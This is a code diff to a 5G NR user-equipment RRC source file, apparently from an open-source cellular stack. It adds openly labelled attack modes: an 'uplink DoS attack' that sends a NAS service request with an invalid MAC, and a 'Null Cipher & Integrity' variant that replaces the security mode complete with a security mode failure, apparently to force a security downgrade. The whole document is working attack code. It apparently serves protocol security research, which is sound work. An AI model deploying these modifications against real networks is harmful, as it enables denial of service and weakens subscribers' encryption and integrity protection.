@@ -98,6 +98,13 @@ static const char  nr_nas_attach_req_imsi[] = {
   0x01, 0x27, 0x11,
 };
 
+/* NAS Service request with IMSI for uplink DoS attack */
+static const char _nas_service_request[] = {
+  0x07, 0x4d,
+  0x4, // KSI and sequence number
+  0xff, 0xff // Short MAC (Invalid)
+};
+
 void
 nr_rrc_ue_process_ueCapabilityEnquiry(
   const protocol_ctxt_t *const ctxt_pP,
@@ -1320,7 +1327,13 @@ static void rrc_ue_generate_RRCSetupComplete(
     }
     nas_msg = (char*)initialNasMsg.data;
     nas_msg_length = initialNasMsg.length;
-  } else {
+  }
+  else if (uplink_dos_attack /* != 0 */) {
+    LOG_E(RRC, "[Uplink DoS] encoding service request with invalid MAC\n");
+    nas_msg = _nas_service_request;
+    nas_msg_length = sizeof(_nas_service_request);
+  }
+  else {
     nas_msg         = nr_nas_attach_req_imsi;
     nas_msg_length  = sizeof(nr_nas_attach_req_imsi);
   }
@@ -1567,7 +1580,11 @@ void nr_rrc_ue_process_securityModeCommand(const protocol_ctxt_t *const ctxt_pP,
   ul_dcch_msg.message.present = NR_UL_DCCH_MessageType_PR_c1;
   ul_dcch_msg.message.choice.c1 = calloc(1, sizeof(*ul_dcch_msg.message.choice.c1));
 
-  if (securityMode >= NO_SECURITY_MODE) {
+  if (null_cipher_integ == 1) {
+    LOG_E(RRC, "[Null Cipher & Integrity] Variant 1: overwrite RRC SECURITY_MODE_COMPLETE with SECURITY_MODE_FAILURE\n");
+    ul_dcch_msg.message.choice.c1->present = NR_UL_DCCH_MessageType__c1_PR_securityModeFailure;
+  }
+  else if (securityMode >= NO_SECURITY_MODE) {
     LOG_I(NR_RRC, "rrc_ue_process_securityModeCommand, security mode complete case \n");
     ul_dcch_msg.message.choice.c1->present = NR_UL_DCCH_MessageType__c1_PR_securityModeComplete;
   } else {
